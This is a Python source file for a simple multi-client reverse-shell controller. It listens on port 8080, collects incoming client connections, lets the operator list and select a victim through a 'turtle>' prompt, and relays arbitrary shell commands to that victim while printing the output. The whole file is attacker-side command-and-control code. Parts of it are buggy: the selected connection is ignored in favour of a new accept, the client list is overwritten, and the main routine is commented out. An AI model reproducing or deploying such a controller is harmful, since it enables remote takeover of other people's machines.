import sys
import time
import threading
import socket
from queue import Queue

no_of_threads=2
#thread numbers
job_num=[1,2]
queue=Queue()
all_connection=[]
all_address=[]


#now creating a socket
def create_socket():
    try:
        global host
        global port
        global s
        host=""
        port=8080
        s=socket.socket()
    except socket.error as msg:
        print(str(msg))

#binding the socket and listen for the connection
#means need to bind the host and the port
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port : ",str(port))
        s.bind((host,port))
        #no. of connection it would tolerate to listen ...
        n=5
        s.listen(n)


    except socket.error as msg:
        print(str(msg)+"\n"+"retrying ....")
        bind_socket()


#closing previous connection

def accepting_connection():
    for c in all_connection:
        c.close()
    del all_connection[:]
    del all_address[:]

    while True:
        try:
            conn,address=s.accept()
            s.setblocking(flag=1) #prevents time out
            all_connection.append(conn)
            all_address.append(address)

            print("Conection is established : ",address[0])
        except:
            print("Error accepting connection")

#second thread function is now come
#1) we will see all the clients 2) select a client 3)send commands the connected client
#custom shell .

#display all the connection
def list_connection():
    results=""

    for i,conn in enumerate(all_connection):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connection[i]
            del all_address[i]
            continue
        results=str(i)+"  "+str(all_address[i][0])+"  "+str(all_address[i][1])+" \n"

    print("-----------------Clients--------- : "+"\n"+results)

def get_target(cmd):
    try:
        target=cmd.replace("select ",'')# target =id
        target=int(target)
        conn=all_connection[target]
        print("you are now connected to the "+str(all_address[target][0]))
        print(str(all_address[target][0])+" >",end="")
        return conn
    except:
        print("connectoin not valid")
        return None

def send_target_commands(conn):
    # connection and address .
    connection, address = s.accept()
    print("Connection has been established : " + "IP " + address[0] + "  port  " + str(address[1]))
    # the function wchich run the commands run on client side
    send_command(connection)
    # end of acception
    connection.close()


def send_command(conn):
    # connection and address .
    while True:
        try:
            cmd=input()
            if cmd=="quit":
                break
            if len(str.encode(cmd)) > 0:
                #sending the command :
                conn.send(str.encode(cmd))
                #chunk standard size 1024
                client_response=str(conn.recv(1024),"utf-8")
                print("Client response is ",client_response,end="")
        except:
            print("Error Sending Commands .")
            break

def turle_shell():
    while True:
        cmd=input('turtle> ')
        if cmd=='list':
            list_connection()
        elif 'select' in cmd:
            conn=get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command Not Found .")

#establist the  connection with the client and socket must be listening
'''
def socket_accect():
    #connection and address .
    connection,address=s.accept()
    print("Connection has been established : "+"IP "+address[0]+"  port  "+str(address[1]))
    #the function wchich run the commands run on client side
    send_command(connection)
    #end of acception
    connection.close()
def send_command(conn):
    while True:
        cmd=input()
        if cmd=="quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            #sending the command :
            conn.send(str.encode(cmd))
            #chunk standard size 1024
            client_response=str(conn.recv(1024),"utf-8")
            print("Client response is ",client_response,end="")

def main():
    create_socket()
    bind_socket()
    socket_accect()

main()
'''